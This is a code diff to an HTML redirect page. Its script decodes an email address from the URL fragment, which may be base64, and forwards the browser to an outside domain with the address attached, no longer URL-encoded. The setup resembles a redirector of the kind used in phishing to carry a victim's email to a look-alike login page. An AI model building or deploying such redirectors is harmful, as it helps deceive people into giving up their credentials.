@@ -7,7 +7,6 @@
     function isBase64(str) {
       try {
         const decoded = atob(str);
-        // Check for valid email format after decoding
         return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
       } catch (e) {
         return false;
@@ -15,26 +14,25 @@
     }
 
     window.onload = function () {
-      const hash = decodeURIComponent(window.location.hash.substring(1)).trim();
-      const baseUrl = "http://newdomain.com/#";
+      let hash = decodeURIComponent(window.location.hash.substring(1)).trim();
 
-      if (!hash) {
-        window.location.href = baseUrl;
-        return;
-      }
-
-      let email = hash;
+      if (!hash) return;
 
       if (isBase64(hash)) {
-        email = atob(hash);
+        try {
+          hash = atob(hash);
+        } catch (e) {
+          return; // Invalid base64
+        }
       }
 
-      const finalUrl = baseUrl + encodeURIComponent(email);
-      window.location.href = finalUrl;
+      // Avoid encoding the email so @ stays intact
+      const newUrl = "http://newdomain.com/#" + hash;
+      window.location.href = newUrl;
     };
   </script>
 </head>
 <body>
-  <p>Redirecting... If it doesn't happen automatically, <a id="manualLink" href="#">click here</a>.</p>
+  <p>Redirecting...</p>
 </body>
 </html>
